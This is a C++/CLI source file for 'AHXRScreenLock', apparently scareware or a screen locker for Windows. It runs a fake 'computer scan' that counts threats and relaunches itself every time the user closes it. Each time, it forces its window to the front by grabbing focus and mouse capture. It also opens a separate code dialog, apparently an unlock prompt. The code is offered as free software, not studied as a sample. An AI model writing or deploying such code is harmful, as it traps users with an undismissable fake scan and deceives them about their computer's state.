/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
//#define						DEBUG

#include						<string>
#include						<time.h>
#include						<Windows.h>
#include						<fstream>

HANDLE							h_update;
DWORD							dh_update;
HANDLE							c_handle;
DWORD							dc_handle;
bool							b_closed;
int								i_scan_idx = 0;
int								i_list_num = 0;
int								i_files_scanned = 0;
int								i_files_threats = 0;

void							resetScanVariables();
void							showCodeDialog();
DWORD WINAPI					t_run_scanner(LPVOID lpParameter);
DWORD WINAPI					t_run_code_gui(LPVOID lpParameter);

#include						"scan.h"
#include						"frmMain.h"
#include						"frmCode.h"
#include						"resource.h"

using namespace					System;
using namespace					System::Windows::Forms;

[STAThread]
#ifdef DEBUG
void main()
#else
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow)
#endif
{
	h_update = CreateThread(0, 0, t_run_scanner, 0, 0, &dh_update);
	/*
		Here is the force-scan. If the client closes the scanner out, the program will
		automatically scan itself after being closed 15 seconds prior.
	*/

	while (1)
	{
		if (b_closed) { 
			b_closed = false;
			resetScanVariables();
			
			h_update = CreateThread(0, 0, t_run_scanner, 0, 0, &dh_update);

			Sleep(2000); // Give the thread time to create the GUI.
			HWND h_update_gui = FindWindow(NULL, SCAN_WINDOW_NAME);

			// Bring the scanner to front.
			SetActiveWindow(h_update_gui);
			SetFocus(h_update_gui);
			SetCapture(h_update_gui);
			SetForegroundWindow(h_update_gui);
			EnableWindow(h_update_gui, true);

			startComputerScan();
		}
		Sleep(15000);
	}
}

void showCodeDialog() {
	CloseHandle(c_handle);
	c_handle = CreateThread(0, 0, t_run_code_gui, 0, 0, &dc_handle);
}

void resetScanVariables() {
	i_scan_idx = 0;
	i_list_num = 0;
	i_files_scanned = 0;
	i_files_threats = 0;
}

DWORD WINAPI t_run_code_gui(LPVOID lpParameter) {
	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);
	AHXRShutdown::frmCode frm;
	Application::Run(%frm);
	return 0;
}

DWORD WINAPI t_run_scanner(LPVOID lpParameter) {
	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);
	AHXRShutdown::frmMain frm;
	Application::Run(%frm);
	return 0;
}